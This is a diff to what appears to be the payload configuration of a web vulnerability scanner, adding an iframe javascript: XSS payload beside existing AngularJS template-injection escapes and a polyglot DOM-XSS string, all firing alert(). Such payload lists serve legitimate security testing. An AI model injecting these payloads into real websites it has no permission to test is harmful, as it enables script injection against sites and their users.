@@ -223,6 +223,7 @@ xss:
     - "{{constructor.constructor('alert(\"XSS\")')()}}"
     - "{{$on.constructor('alert(\"XSS\")')()}}"
     - "{{10000000000 * 10000000000}}" # Dùng để test mù (Blind)
+    - '<iframe src="javascript:alert(`xss`)">'
 
 # DOM-based XSS Configuration
 dom_xss:
@@ -252,6 +253,7 @@ dom_xss:
     - "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(\"DOMXSS\"),a')}}"
     - "{{$eval.constructor('alert(\"DOMXSS\")')()}}"
     - 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=''+/"/+/onmouseover=1/+/[*/[]/+alert(''DOMXSS'')//''>'
+
 
 # XML External Entity Tester
 xxe:
